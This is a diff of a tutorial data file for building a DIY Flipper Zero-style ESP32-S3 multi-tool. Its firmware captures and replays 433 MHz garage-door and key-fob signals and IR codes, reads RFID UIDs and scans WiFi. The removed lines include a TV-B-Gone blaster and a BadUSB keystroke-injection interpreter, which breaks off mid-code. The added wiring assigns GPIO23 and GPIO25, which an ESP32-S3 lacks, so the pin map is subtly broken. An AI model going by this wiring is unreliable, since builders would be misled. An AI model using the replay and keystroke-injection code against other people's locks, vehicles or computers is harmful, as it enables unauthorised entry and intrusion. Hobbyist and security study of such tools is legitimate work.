+               '<p><strong>Legal requirement:</strong> The CC1101 can transmit across 300-928 MHz. In the US, unlicensed ISM band operation (315, 433, 868, 915 MHz) is governed by FCC Part 15 &mdash; low power, no harmful interference. Transmitting on licensed frequencies or jamming existing signals violates 47 U.S.C. &sect; 333 and carries significant penalties. All RFID, BadUSB, and IR features carry the same restrictions as SG-41 and SG-33 respectively.</p>',
 
-        wiring: '    FULL WIRING DIAGRAM\n' +
-                '\n' +
-                '    ESP32-S3 --> CC1101 (Sub-GHz, SPI bus 1)\n' +
-                '    GPIO35 (MOSI)  --> CC1101 MOSI\n' +
-                '    GPIO37 (MISO)  --> CC1101 MISO\n' +
-                '    GPIO36 (SCK)   --> CC1101 SCK\n' +
-                '    GPIO38 (CS)    --> CC1101 CSN\n' +
-                '    GPIO39         --> CC1101 GDO0\n' +
-                '    3V3            --> CC1101 VCC\n' +
-                '    GND            --> CC1101 GND\n' +
-                '\n' +
-                '    ESP32-S3 --> RC522 (NFC, SPI bus 2)\n' +
-                '    GPIO11 (MOSI)  --> RC522 MOSI\n' +
-                '    GPIO13 (MISO)  --> RC522 MISO\n' +
-                '    GPIO12 (SCK)   --> RC522 SCK\n' +
-                '    GPIO10 (CS)    --> RC522 SDA\n' +
-                '    GPIO14         --> RC522 RST\n' +
-                '    3V3            --> RC522 3.3V\n' +
-                '    GND            --> RC522 GND\n' +
-                '\n' +
-                '    ESP32-S3 --> IR\n' +
-                '    GPIO40 --> IR LED (via NPN transistor + 100ohm)\n' +
-                '    GPIO41 --> TSOP38238 OUT\n' +
-                '    3V3    --> TSOP38238 VCC\n' +
-                '    GND    --> TSOP38238 GND\n' +
-                '\n' +
-                '    ESP32-S3 --> TFT ST7735 (SPI shared with RC522)\n' +
-                '    GPIO11 (MOSI) --> TFT SDA   (shared)\n' +
-                '    GPIO12 (SCK)  --> TFT SCK   (shared)\n' +
-                '    GPIO15 (CS)   --> TFT CS\n' +
-                '    GPIO16 (DC)   --> TFT DC\n' +
-                '    GPIO17 (RST)  --> TFT RES\n' +
-                '    3V3           --> TFT VCC\n' +
-                '    GND           --> TFT GND\n' +
-                '\n' +
-                '    Buttons (to GND, internal pull-up):\n' +
-                '    GPIO1=UP  GPIO2=DOWN  GPIO3=LEFT  GPIO4=RIGHT  GPIO5=OK\n' +
-                '\n' +
-                '    MicroSD (SPI shared with RC522/TFT):\n' +
-                '    GPIO11/12/13 (shared MOSI/SCK/MISO)  GPIO6=CS',
+        wiring: [
+            'SG-42 Full Wiring -- ESP32-S3 + CC1101 + TFT + RC522 + IR + Nav',
+            '',
+            'CC1101 Sub-GHz RF Module (SPI Bus 1 / VSPI)',
+            'CC1101 Pin    ESP32-S3 GPIO   Notes',
+            'VCC           3.3V            Max 100mA -- use local bypass cap',
+            'GND           GND',
+            'SCK           GPIO18          SPI clock (shared with TFT)',
+            'MOSI          GPIO23          SPI data out (shared with TFT)',
+            'MISO / GDO1   GPIO19          SPI data in (shared with TFT)',
+            'CS / CSN      GPIO5           Chip select -- separate from TFT',
+            'GDO0          GPIO4           Data out / packet received IRQ',
+            '',
+            '1.8" TFT Display ST7735 (SPI Bus 1 -- shared with CC1101)',
+            'TFT Pin       ESP32-S3 GPIO   Notes',
+            'VCC           3.3V',
+            'GND           GND',
+            'CS            GPIO2           Separate CS from CC1101 (GPIO5)',
+            'RESET         GPIO17',
+            'DC/RS         GPIO16',
+            'SDA/MOSI      GPIO23          Shared SPI bus',
+            'SCK/CLK       GPIO18          Shared SPI bus',
+            'LED           3.3V            Backlight',
+            '',
+            'RC522 RFID Module (SPI Bus 2 / HSPI -- separate bus)',
+            'RC522 Pin     ESP32-S3 GPIO   Notes',
+            'VCC           3.3V',
+            'GND           GND',
+            'RST           GPIO33',
+            'SDA/CS        GPIO34          SPI2 Chip Select',
+            'SCK           GPIO36          SPI2 Clock',
+            'MOSI          GPIO35          SPI2 MOSI',
+            'MISO          GPIO37          SPI2 MISO',
+            '',
+            'IR LED + TSOP38238 Receiver',
+            'Component     ESP32-S3 GPIO   Notes',
+            'IR LED anode  GPIO25          Through 47-ohm resistor',
+            'IR LED cathode GND',
+            'TSOP38238 OUT GPIO26          3.3V compatible output',
+            'TSOP38238 VCC 3.3V            Add 100nF bypass capacitor',
+            'TSOP38238 GND GND',
+            '',
+            '5-Way Navigation Switch (all active LOW, internal pullups)',
+            'UP=GPIO6, DOWN=GPIO7, LEFT=GPIO8, RIGHT=GPIO9, OK=GPIO10',
+            'COM=GND',
+            '',
+            'LiPo + TP4056: same as SG-38 (OUT+ -> ESP32-S3 VIN)',
+        ].join('\n'),
 
-        wiringNotes: '<p><strong>Two SPI buses:</strong> The ESP32-S3 has two hardware SPI controllers (FSPI and HSPI). We use FSPI for the CC1101 and HSPI for the RC522/TFT/SD (which share the bus with separate CS pins). This avoids bus contention between the Sub-GHz radio and the NFC module.</p>' +
-                     '<p><strong>IR circuit:</strong> The IR LED needs more current than a GPIO pin can provide. Use an NPN transistor (2N2222 or BC547) as a switch, with a 100-ohm resistor on the LED. This gives bright, long-range IR output.</p>' +
-                     '<p><strong>This is a complex build:</strong> With 6 modules, 2 SPI buses, and 20+ wires, take your time with wiring. Label every wire. Test each module individually before connecting everything together.</p>',
+        wiringNotes: '<p><strong>SPI bus architecture:</strong> The CC1101 and TFT share SPI Bus 1 (VSPI on GPIO18/23/19) with separate CS lines (TFT_CS=2, CC1101_CS=5). The RC522 uses SPI Bus 2 (HSPI on GPIO36/35/37) with its own independent SCK/MOSI/MISO lines. This separation prevents timing conflicts between the fast ST7735 SPI clock and the CC1101\'s more sensitive RF timing. Add 100nF bypass capacitors on each module\'s VCC pin as close to the IC as possible to prevent SPI glitches.</p>',
 
         steps: [
             {
-                title: 'Plan and Test Each Module Independently',
-                content: '<p>Do not try to wire everything at once. Build and test each module separately, then combine them. The order:</p>' +
-                         '<ol>' +
-                         '<li><strong>ESP32-S3 + TFT display:</strong> Get the screen working first. This is your feedback mechanism for everything else.</li>' +
-                         '<li><strong>Add buttons:</strong> Wire the 5 navigation buttons and build the menu system.</li>' +
-                         '<li><strong>Add RC522 NFC:</strong> You already built this in SG-41. Same wiring, same code.</li>' +
-                         '<li><strong>Add CC1101 Sub-GHz:</strong> New module &mdash; covered in Step 3.</li>' +
-                         '<li><strong>Add IR TX/RX:</strong> Simple GPIO &mdash; covered in Step 4.</li>' +
-                         '<li><strong>Add USB HID:</strong> ESP32-S3 native USB &mdash; same concept as SG-33.</li>' +
-                         '<li><strong>Add MicroSD:</strong> For saving captured signals, payloads, and IR codes.</li>' +
-                         '</ol>',
-                code: null,
-                language: null,
-                tip: '<strong>Build philosophy:</strong> Get each module working in isolation with a simple test sketch before integrating. When you combine them, add one module at a time. This way, when something breaks, you know exactly which module caused the problem.'
+                title: 'Install All Required Libraries',
+                content: '<p>Install the following via Arduino Library Manager before attempting to compile:</p>' +
+                         '<ul><li><strong>Adafruit ST7735 and ST7789 Library</strong> &mdash; TFT display</li><li><strong>Adafruit GFX Library</strong> &mdash; required dependency</li><li><strong>MFRC522</strong> by GithubCommunity &mdash; RFID</li><li><strong>IRremoteESP8266</strong> by David Conran &mdash; IR send/receive (works on ESP32 despite the name)</li><li><strong>SmartRC-CC1101-Driver-Lib</strong> by LSatan &mdash; CC1101 driver</li></ul>' +
+                         '<p>The CC1101 library requires manual install. Download from <a href="https://github.com/LSatan/SmartRC-CC1101-Driver-Lib" style="color:#ff6b35">github.com/LSatan/SmartRC-CC1101-Driver-Lib</a> as a ZIP and install via <strong>Sketch &rarr; Include Library &rarr; Add .ZIP Library</strong>. Edit the library\'s <code>ELECHOUSE_CC1101_SRC_DRV.h</code> to change the default CS pin from 10 to 5: find <code>#define ss 10</code> and change to <code>#define ss 5</code>.</p>'
             },
             {
-                title: 'Build the Menu System',
-                content: '<p>The menu system is the backbone of the device. It provides a navigable interface for all modules, similar to the Flipper Zero\'s UI.</p>',
-                code: '#include <TFT_eSPI.h>\n\nTFT_eSPI tft = TFT_eSPI();\n\n// Button pins\n#define BTN_UP    1\n#define BTN_DOWN  2\n#define BTN_LEFT  3\n#define BTN_RIGHT 4\n#define BTN_OK    5\n\n// Menu structure\nstruct MenuItem {\n    const char* label;\n    void (*action)();\n};\n\n// Forward declarations\nvoid menu_subghz();\nvoid menu_nfc();\nvoid menu_ir();\nvoid menu_badusb();\nvoid menu_wifi();\nvoid menu_bluetooth();\nvoid menu_settings();\n\nMenuItem mainMenu[] = {\n    {"Sub-GHz",      menu_subghz},\n    {"NFC/RFID",     menu_nfc},\n    {"Infrared",     menu_ir},\n    {"Bad USB",      menu_badusb},\n    {"WiFi Tools",   menu_wifi},\n    {"Bluetooth",    menu_bluetooth},\n    {"Settings",     menu_settings},\n};\nint menuSize = sizeof(mainMenu) / sizeof(MenuItem);\nint menuIndex = 0;\n\nvoid drawMenu() {\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_RED);\n    tft.setTextSize(1);\n    tft.setCursor(10, 5);\n    tft.println("DIY FLIPPER");\n    tft.drawLine(0, 15, 160, 15, TFT_DARKGREY);\n\n    for (int i = 0; i < menuSize; i++) {\n        int y = 22 + (i * 14);\n        if (i == menuIndex) {\n            tft.fillRect(0, y - 1, 160, 13, TFT_NAVY);\n            tft.setTextColor(TFT_WHITE);\n            tft.setCursor(5, y);\n            tft.print("> ");\n        } else {\n            tft.setTextColor(TFT_LIGHTGREY);\n            tft.setCursor(5, y);\n            tft.print("  ");\n        }\n        tft.println(mainMenu[i].label);\n    }\n}\n\nvoid handleButtons() {\n    if (digitalRead(BTN_UP) == LOW) {\n        menuIndex = (menuIndex - 1 + menuSize) % menuSize;\n        drawMenu();\n        delay(200);\n    }\n    if (digitalRead(BTN_DOWN) == LOW) {\n        menuIndex = (menuIndex + 1) % menuSize;\n        drawMenu();\n        delay(200);\n    }\n    if (digitalRead(BTN_OK) == LOW) {\n        mainMenu[menuIndex].action();\n        delay(200);\n    }\n}\n\nvoid setup() {\n    tft.init();\n    tft.setRotation(1);\n    for (int pin : {BTN_UP, BTN_DOWN, BTN_LEFT, BTN_RIGHT, BTN_OK}) {\n        pinMode(pin, INPUT_PULLUP);\n    }\n    drawMenu();\n}\n\nvoid loop() {\n    handleButtons();\n    delay(50);\n}',
-                language: 'C++',
-                tip: '<strong>Tip:</strong> Use the <code>TFT_eSPI</code> library for the display. It is fast, well-documented, and supports the ST7735 natively. Configure your pin mappings in <code>User_Setup.h</code> within the library folder.'
+                title: 'Verify CC1101 Communication',
+                content: '<p>Flash this test sketch first to confirm CC1101 SPI wiring before loading the full firmware:</p>',
+                code: '#include <ELECHOUSE_CC1101_SRC_DRV.h>\n\nvoid setup() {\n    Serial.begin(115200);\n    // getCC1101() reads the CC1101 chip version register via SPI\n    if (ELECHOUSE_cc1101.getCC1101()) {\n        Serial.println("CC1101 OK -- SPI communication confirmed");\n    } else {\n        Serial.println("CC1101 NOT FOUND -- check wiring and CS pin");\n        while (true);\n    }\n    // Configure for 433.92 MHz ASK/OOK (garage door / key fob band)\n    ELECHOUSE_cc1101.Init();\n    ELECHOUSE_cc1101.SetMHZ(433.92);\n    ELECHOUSE_cc1101.SetModulation(2);  // 0=2-FSK, 1=GFSK, 2=ASK/OOK\n    ELECHOUSE_cc1101.SetDRate(2.4);     // Data rate kbps\n    ELECHOUSE_cc1101.SetRxBW(812.5);    // Receive bandwidth kHz\n    ELECHOUSE_cc1101.SetRx();\n    Serial.println("Listening on 433.92 MHz...");\n    Serial.println("Press a 433MHz remote to receive data");\n}\n\nvoid loop() {\n    if (digitalRead(4) == HIGH) {  // GDO0 signals data in FIFO\n        byte buf[128];\n        int len = ELECHOUSE_cc1101.ReceiveData(buf);\n        if (len > 0) {\n            Serial.printf("Received %d bytes: ", len);\n            for (int i = 0; i < len; i++) Serial.printf("%02X ", buf[i]);\n            Serial.println();\n        }\n    }\n}',
+                language: 'Arduino (C++)',
+                tip: 'The CC1101 module requires a wire antenna for any useful range. Solder a 17.3cm piece of solid-core wire to the ANT pad on the CC1101 module for 433 MHz (quarter-wave). Without an antenna, range is under 30cm.'
             },
             {
-                title: 'Add Sub-GHz RF (CC1101)',
-                content: '<p>The CC1101 is a programmable Sub-GHz transceiver that operates from 300MHz to 928MHz. It can receive and transmit signals used by garage door openers, car key fobs, wireless doorbells, weather stations, and other devices that communicate in the ISM bands (315MHz, 433MHz, 868MHz, 915MHz).</p>' +
-                         '<p>Capabilities: signal capture, signal replay, frequency analysis, and brute-force (for simple fixed-code systems).</p>',
-                code: '#include <ELECHOUSE_CC1101_SRC_DRV.h>\n\n// CC1101 on HSPI\n#define CC1101_CS  38\n#define CC1101_GDO0 39\n\nvoid menu_subghz() {\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_MAGENTA);\n    tft.println("Sub-GHz RF");\n    tft.setTextColor(TFT_WHITE);\n    tft.println("1. Scan frequencies");\n    tft.println("2. Capture signal");\n    tft.println("3. Replay signal");\n    tft.println("4. Frequency analyzer");\n}\n\nvoid subghz_capture() {\n    // Initialize CC1101 at 433.92 MHz (common frequency)\n    ELECHOUSE_cc1101.Init();\n    ELECHOUSE_cc1101.setMHZ(433.92);\n    ELECHOUSE_cc1101.SetRx();  // Enter receive mode\n\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_GREEN);\n    tft.println("Listening on 433.92MHz...");\n    tft.println("Press a remote button now.");\n\n    // Capture raw signal\n    uint8_t buffer[256];\n    int len = 0;\n    unsigned long timeout = millis() + 10000;  // 10s timeout\n\n    while (millis() < timeout) {\n        if (ELECHOUSE_cc1101.CheckReceiveFlag()) {\n            len = ELECHOUSE_cc1101.ReceiveData(buffer);\n            if (len > 0) {\n                tft.setTextColor(TFT_YELLOW);\n                tft.printf("Captured %d bytes!\\n", len);\n\n                // Save to SD card\n                File f = SD.open("/signals/capture.raw", FILE_WRITE);\n                f.write(buffer, len);\n                f.close();\n\n                tft.println("Saved to SD card.");\n                break;\n            }\n        }\n    }\n    ELECHOUSE_cc1101.setSidle();  // Return to idle\n}\n\nvoid subghz_replay() {\n    // Read captured signal from SD\n    File f = SD.open("/signals/capture.raw", FILE_READ);\n    if (!f) {\n        tft.println("No capture file found!");\n        return;\n    }\n\n    uint8_t buffer[256];\n    int len = f.read(buffer, sizeof(buffer));\n    f.close();\n\n    // Transmit\n    ELECHOUSE_cc1101.Init();\n    ELECHOUSE_cc1101.setMHZ(433.92);\n    ELECHOUSE_cc1101.SetTx();\n\n    tft.println("Replaying signal...");\n    ELECHOUSE_cc1101.SendData(buffer, len);\n\n    tft.setTextColor(TFT_GREEN);\n    tft.println("Signal transmitted!");\n    ELECHOUSE_cc1101.setSidle();\n}',
-                language: 'C++',
-                tip: '<strong>Legal note:</strong> Transmitting on certain frequencies requires a license in most countries. For testing, use low power settings and only interact with devices you own. Replaying garage door signals on someone else\'s property is illegal.'
+                title: 'Flash the Full Multi-Tool Firmware',
+                content: '<p>This firmware implements the TFT menu system, 5-way navigation, Sub-GHz RF capture/replay, IR capture/replay, WiFi scanning, and RFID reading as a state machine:</p>',
+                code: '#include <SPI.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_ST7735.h>\n#include <MFRC522.h>\n#include <IRremoteESP8266.h>\n#include <IRrecv.h>\n#include <IRsend.h>\n#include <ELECHOUSE_CC1101_SRC_DRV.h>\n#include <WiFi.h>\n\n// TFT (VSPI)\n#define TFT_CS   2\n#define TFT_RST  17\n#define TFT_DC   16\n// CC1101 (VSPI -- shared bus with TFT)\n#define CC1101_CS   5\n#define CC1101_GDO0 4\n// RC522 (HSPI)\n#define RC522_CS   34\n#define RC522_RST  33\n#define RC522_SCK  36\n#define RC522_MOSI 35\n#define RC522_MISO 37\n// IR\n#define IR_SEND_PIN 25\n#define IR_RECV_PIN 26\n// Nav buttons\n#define BTN_UP  6\n#define BTN_DN  7\n#define BTN_LT  8\n#define BTN_RT  9\n#define BTN_OK 10\n\nAdafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);\nSPIClass spi2(HSPI);\nMFRC522  rfid(RC522_CS, RC522_RST, spi2);\nIRrecv   irRecv(IR_RECV_PIN, 1024, 50, true);\nIRsend   irSend(IR_SEND_PIN);\n\n// Colors (RGB565)\n#define C_BG     0x0841\n#define C_ACCENT 0xFB60   // ~#ff6b00\n#define C_WHITE  0xFFFF\n#define C_DIM    0x8410\n#define C_GREEN  0x07E0\n#define C_RED    0xF800\n\n// Menu state machine\nenum State { MENU_MAIN, MENU_RF, MENU_RFID, MENU_IR,\n             ACT_RF_CAP, ACT_RF_PLAY, ACT_RFID_READ,\n             ACT_IR_CAP, ACT_IR_PLAY, ACT_WIFI };\nState state = MENU_MAIN;\nint   midx  = 0;\n\nconst char* mainItems[] = {"Sub-GHz RF","RFID / NFC","Infrared","WiFi Scan"};\nconst char* rfItems[]   = {"Capture","Replay","Back"};\nconst char* irItems[]   = {"Capture","Replay","Back"};\n\n// Captured data\nuint8_t rfBuf[512]; int rfLen = 0; bool hasRF = false;\ndecode_results irData;             bool hasIR = false;\n\nvoid drawMenu(const char** items, int n, int sel, const char* title) {\n    tft.fillScreen(C_BG);\n    tft.fillRect(0, 0, 160, 18, C_ACCENT);\n    tft.setTextColor(C_BG); tft.setTextSize(1);\n    tft.setCursor(4, 5); tft.print(title);\n    for (int i = 0; i < n; i++) {\n        int y = 22 + i * 18;\n        if (i == sel) { tft.fillRect(0, y-1, 160, 14, 0x2945); tft.setTextColor(C_ACCENT); }\n        else { tft.setTextColor(C_WHITE); }\n        tft.setCursor(8, y); tft.print(items[i]);\n    }\n    tft.setTextColor(C_DIM); tft.setCursor(4, 120); tft.print("UP/DN=nav  OK=sel");\n}\n\nvoid statusScr(const char* title, const char* l1,\n               const char* l2 = "", uint16_t tc = C_ACCENT) {\n    tft.fillScreen(C_BG);\n    tft.fillRect(0, 0, 160, 18, tc);\n    tft.setTextColor(C_BG); tft.setTextSize(1);\n    tft.setCursor(4, 5); tft.print(title);\n    tft.setTextColor(C_WHITE);\n    tft.setCursor(4, 26); tft.print(l1);\n    tft.setCursor(4, 42); tft.print(l2);\n    tft.setTextColor(C_DIM); tft.setCursor(4, 120); tft.print("LEFT=back");\n}\n\nstruct Btns { bool up, dn, lt, rt, ok; };\nBtns readBtns() {\n    return {!digitalRead(BTN_UP),!digitalRead(BTN_DN),!digitalRead(BTN_LT),\n            !digitalRead(BTN_RT),!digitalRead(BTN_OK)};\n}\nBtns waitBtn(unsigned long ms = 30000) {\n    unsigned long t = millis();\n    while (millis()-t < ms) {\n        Btns b = readBtns();\n        if (b.up||b.dn||b.lt||b.rt||b.ok) { delay(50); return b; }\n        delay(20);\n    }\n    return {};\n}\n\nvoid rfCapture() {\n    statusScr("RF CAPTURE", "Press remote...", "5s timeout");\n    ELECHOUSE_cc1101.Init();\n    ELECHOUSE_cc1101.SetMHZ(433.92);\n    ELECHOUSE_cc1101.SetModulation(2); ELECHOUSE_cc1101.SetDRate(2.4); ELECHOUSE_cc1101.SetRx();\n    unsigned long t = millis();\n    while (millis()-t < 5000) {\n        if (digitalRead(CC1101_GDO0)) {\n            int len = ELECHOUSE_cc1101.ReceiveData(rfBuf);\n            if (len > 0) { rfLen = len; hasRF = true;\n                char m[24]; snprintf(m, 24, "%d bytes captured", len);\n                statusScr("RF CAPTURED", m, "OK=replay", C_GREEN); delay(2000); return; }\n        }\n    }\n    statusScr("RF CAPTURE", "No signal", "Timeout", C_RED); delay(1500);\n}\n\nvoid rfReplay() {\n    if (!hasRF) { statusScr("RF REPLAY", "No data", "Capture first", C_RED); delay(1500); return; }\n    statusScr("RF REPLAY", "Transmitting...", "");\n    ELECHOUSE_cc1101.Init(); ELECHOUSE_cc1101.SetMHZ(433.92);\n    ELECHOUSE_cc1101.SetModulation(2); ELECHOUSE_cc1101.SetDRate(2.4);\n    ELECHOUSE_cc1101.SetTx();\n    ELECHOUSE_cc1101.SendData(rfBuf, rfLen);\n    ELECHOUSE_cc1101.SetRx();\n    statusScr("RF REPLAY", "Sent!", "", C_GREEN); delay(1200);\n}\n\nvoid irCapture() {\n    statusScr("IR CAPTURE", "Point remote at", "sensor + press btn");\n    irRecv.enableIRIn();\n    unsigned long t = millis();\n    while (millis()-t < 10000) {\n        if (irRecv.decode(&irData)) {\n            hasIR = true;\n            char m[28]; snprintf(m, 28, "Proto:%d  %08lX", irData.decode_type, (unsigned long)irData.value);\n            statusScr("IR CAPTURED", m, "OK=replay", C_GREEN);\n            irRecv.resume(); return;\n        }\n        delay(50);\n    }\n    statusScr("IR CAPTURE", "No signal", "10s timeout", C_RED); delay(1500);\n}\n\nvoid irReplay() {\n    if (!hasIR) { statusScr("IR REPLAY", "No data", "Capture first", C_RED); delay(1500); return; }\n    irSend.begin();\n    irSend.send(irData.decode_type, irData.value, irData.bits);\n    statusScr("IR REPLAY", "Signal sent!", "", C_GREEN); delay(1000);\n}\n\nvoid wifiScan() {\n    statusScr("WIFI SCAN", "Scanning...", "");\n    WiFi.mode(WIFI_STA); WiFi.disconnect();\n    int n = WiFi.scanNetworks(false, true);\n    tft.fillScreen(C_BG);\n    tft.fillRect(0, 0, 160, 18, C_ACCENT);\n    tft.setTextColor(C_BG); tft.setTextSize(1);\n    tft.setCursor(4, 5); tft.printf("WIFI: %d APs", n);\n    tft.setTextColor(C_WHITE);\n    for (int i = 0; i < min(n, 5); i++) {\n        tft.setCursor(4, 22 + i*18);\n        String s = WiFi.SSID(i); if (s.length() > 14) s = s.substring(0,14);\n        tft.printf("%-14s %3d", s.c_str(), WiFi.RSSI(i));\n    }\n    tft.setTextColor(C_DIM); tft.setCursor(4, 120); tft.print("LEFT=back");\n    WiFi.scanDelete(); waitBtn(15000);\n}\n\nvoid setup() {\n    Serial.begin(115200);\n    for (int p : {BTN_UP,BTN_DN,BTN_LT,BTN_RT,BTN_OK}) pinMode(p, INPUT_PULLUP);\n    tft.initR(INITR_BLACKTAB); tft.setRotation(1);\n    tft.fillScreen(C_BG);\n    tft.setTextColor(C_ACCENT); tft.setTextSize(1);\n    tft.setCursor(4, 20); tft.println("SG-42 MULTI-TOOL");\n    tft.setTextColor(C_WHITE); tft.setCursor(4, 36); tft.println("Initializing...");\n    spi2.begin(RC522_SCK, RC522_MISO, RC522_MOSI, RC522_CS);\n    rfid.PCD_Init();\n    delay(800);\n    drawMenu(mainItems, 4, 0, "SG-42 MULTI-TOOL");\n}\n\nvoid loop() {\n    Btns b = readBtns();\n    if (!b.up&&!b.dn&&!b.lt&&!b.rt&&!b.ok) { delay(20); return; }\n    switch (state) {\n        case MENU_MAIN:\n            if (b.up && midx > 0) { midx--; drawMenu(mainItems, 4, midx, "SG-42 MULTI-TOOL"); }\n            if (b.dn && midx < 3) { midx++; drawMenu(mainItems, 4, midx, "SG-42 MULTI-TOOL"); }\n            if (b.ok) {\n                if (midx==0) { state=MENU_RF;   midx=0; drawMenu(rfItems, 3, 0, "SUB-GHz RF"); }\n                if (midx==1) { statusScr("RFID READ","Hold card...",""); rfid.PCD_Init();\n                    unsigned long t=millis();\n                    while(millis()-t<10000){\n                        if(rfid.PICC_IsNewCardPresent()&&rfid.PICC_ReadCardSerial()){\n                            char m[24]; snprintf(m,24,"UID: %02X %02X %02X %02X",\n                                rfid.uid.uidByte[0],rfid.uid.uidByte[1],\n                                rfid.uid.uidByte[2],rfid.uid.uidByte[3]);\n                            statusScr("RFID READ", m, "", C_GREEN);\n                            rfid.PICC_HaltA(); rfid.PCD_StopCrypto1();\n                            delay(2000); break;\n                        }\n                    }\n                    state=MENU_MAIN; midx=1; drawMenu(mainItems, 4, midx, "SG-42 MULTI-TOOL"); }\n                if (midx==2) { state=MENU_IR;   midx=0; drawMenu(irItems, 3, 0, "INFRARED"); }\n                if (midx==3) { wifiScan(); state=MENU_MAIN; midx=3; drawMenu(mainItems,4,3,"SG-42 MULTI-TOOL"); }\n            }\n            break;\n        case MENU_RF:\n            if (b.up && midx > 0) { midx--; drawMenu(rfItems, 3, midx, "SUB-GHz RF"); }\n            if (b.dn && midx < 2) { midx++; drawMenu(rfItems, 3, midx, "SUB-GHz RF"); }\n            if (b.ok) {\n                if (midx==0) rfCapture();\n                if (midx==1) rfReplay();\n                if (midx==2) { state=MENU_MAIN; midx=0; drawMenu(mainItems,4,0,"SG-42 MULTI-TOOL"); return; }\n                drawMenu(rfItems, 3, midx, "SUB-GHz RF");\n            }\n            if (b.lt) { state=MENU_MAIN; midx=0; drawMenu(mainItems,4,0,"SG-42 MULTI-TOOL"); }\n            break;\n        case MENU_IR:\n            if (b.up && midx > 0) { midx--; drawMenu(irItems, 3, midx, "INFRARED"); }\n            if (b.dn && midx < 2) { midx++; drawMenu(irItems, 3, midx, "INFRARED"); }\n            if (b.ok) {\n                if (midx==0) irCapture();\n                if (midx==1) irReplay();\n                if (midx==2) { state=MENU_MAIN; midx=0; drawMenu(mainItems,4,0,"SG-42 MULTI-TOOL"); return; }\n                drawMenu(irItems, 3, midx, "INFRARED");\n            }\n            if (b.lt) { state=MENU_MAIN; midx=0; drawMenu(mainItems,4,0,"SG-42 MULTI-TOOL"); }\n            break;\n        default:\n            state=MENU_MAIN; midx=0; drawMenu(mainItems,4,0,"SG-42 MULTI-TOOL"); break;\n    }\n    delay(150);\n}',
+                language: 'Arduino (C++)',
+                tip: 'Compile settings: Board=ESP32S3 Dev Module, Flash Size=8MB (if your module has it), PSRAM=OPI PSRAM, Upload Speed=921600. If you get "multiple definition" linker errors, ensure IRremoteESP8266 is only included in the main .ino file and not in any additional .cpp files.'
             },
             {
-                title: 'Add Infrared (IR) Module',
-                content: '<p>The IR module captures and replays infrared signals from remote controls. This works on TVs, air conditioners, projectors, soundbars, and any device with an IR remote. The Flipper Zero\'s IR module is one of its most used features &mdash; it can turn off any TV in range.</p>',
-                code: '#include <IRremoteESP8266.h>\n#include <IRrecv.h>\n#include <IRsend.h>\n#include <IRutils.h>\n\n#define IR_RECV_PIN 41\n#define IR_SEND_PIN 40\n\nIRrecv irrecv(IR_RECV_PIN);\nIRsend irsend(IR_SEND_PIN);\ndecode_results results;\n\nvoid menu_ir() {\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_YELLOW);\n    tft.println("Infrared");\n    tft.setTextColor(TFT_WHITE);\n    tft.println("1. Learn remote");\n    tft.println("2. Replay signal");\n    tft.println("3. TV-B-Gone");\n    tft.println("4. Saved remotes");\n}\n\nvoid ir_learn() {\n    irrecv.enableIRIn();\n    tft.fillScreen(TFT_BLACK);\n    tft.println("Point remote at receiver...");\n    tft.println("Press any button on remote.");\n\n    while (true) {\n        if (irrecv.decode(&results)) {\n            tft.setTextColor(TFT_GREEN);\n            tft.printf("Protocol: %s\\n",\n                typeToString(results.decode_type).c_str());\n            tft.printf("Code: 0x%08X\\n", results.value);\n            tft.printf("Bits: %d\\n", results.bits);\n\n            // Save to SD card\n            File f = SD.open("/ir/captured.txt", FILE_APPEND);\n            f.printf("%s,0x%08X,%d\\n",\n                typeToString(results.decode_type).c_str(),\n                results.value, results.bits);\n            f.close();\n\n            tft.println("Saved! Press another or BACK.");\n            irrecv.resume();\n        }\n        if (digitalRead(BTN_LEFT) == LOW) break;\n    }\n}\n\nvoid ir_replay(uint32_t code, int bits, decode_type_t protocol) {\n    switch (protocol) {\n        case NEC:  irsend.sendNEC(code, bits); break;\n        case SONY: irsend.sendSony(code, bits); break;\n        case RC5:  irsend.sendRC5(code, bits); break;\n        case RC6:  irsend.sendRC6(code, bits); break;\n        case SAMSUNG: irsend.sendSAMSUNG(code, bits); break;\n        default:   irsend.sendRaw(/* raw timing data */);\n    }\n}\n\n// TV-B-Gone: cycle through common TV power codes\nvoid ir_tvbgone() {\n    tft.fillScreen(TFT_BLACK);\n    tft.println("TV-B-Gone Mode");\n    tft.println("Sending power codes...");\n\n    // Common TV power-off codes (NEC protocol)\n    uint32_t powerCodes[] = {\n        0x20DF10EF,  // LG\n        0xE0E040BF,  // Samsung\n        0x40040100,  // Sony\n        0x00FF629D,  // Generic\n    };\n\n    for (uint32_t code : powerCodes) {\n        irsend.sendNEC(code, 32);\n        delay(100);\n    }\n    tft.println("Done!");\n}',
-                language: 'C++',
-                tip: '<strong>TV-B-Gone:</strong> The original TV-B-Gone by Mitch Altman stored ~230 TV power codes and cycled through them. Your DIY version can store thousands of codes on the SD card. Build a database from the IRDB project on GitHub, which has IR codes for most devices ever made.'
-            },
-            {
-                title: 'Add USB HID (Bad USB)',
-                content: '<p>The ESP32-S3 has native USB-OTG support, which means it can enumerate as a USB keyboard without any external hardware. This is the same Rubber Ducky functionality from SG-33, now integrated into your multi-tool.</p>',
-                code: '#include "USB.h"\n#include "USBHIDKeyboard.h"\n\nUSBHIDKeyboard Keyboard;\n\nvoid menu_badusb() {\n    tft.fillScreen(TFT_BLACK);\n    tft.setTextColor(TFT_RED);\n    tft.println("Bad USB");\n    tft.setTextColor(TFT_WHITE);\n    tft.println("1. Run payload");\n    tft.println("2. Select payload");\n    tft.println("3. Edit payload");\n}\n\nvoid badusb_run(const char* payloadFile) {\n    // Initialize USB HID\n    USB.begin();\n    Keyboard.begin();\n    delay(1000);  // Wait for OS recognition\n\n    // Read payload from SD card\n    File f = SD.open(payloadFile);\n    if (!f) {\n        tft.println("Payload not found!");\n        return;\n    }\n\n    tft.println("Executing payload...");\n\n    // Simple DuckyScript interpreter\n    while (f.available()) {\n        String line = f.readStringUntil(\'\\n\');\n        line.trim();\n\n        if (line.startsWith("REM")) {\n            // Comment, skip\n        } else if (line.startsWith("DELAY")) {\n            int ms = line.substring(6).toInt();\n            delay(ms);\n        } else if (line.startsWith("STRING")) {\n            Keyboard.print(line.substring(7));\n        } else if (line == "ENTER") {\n            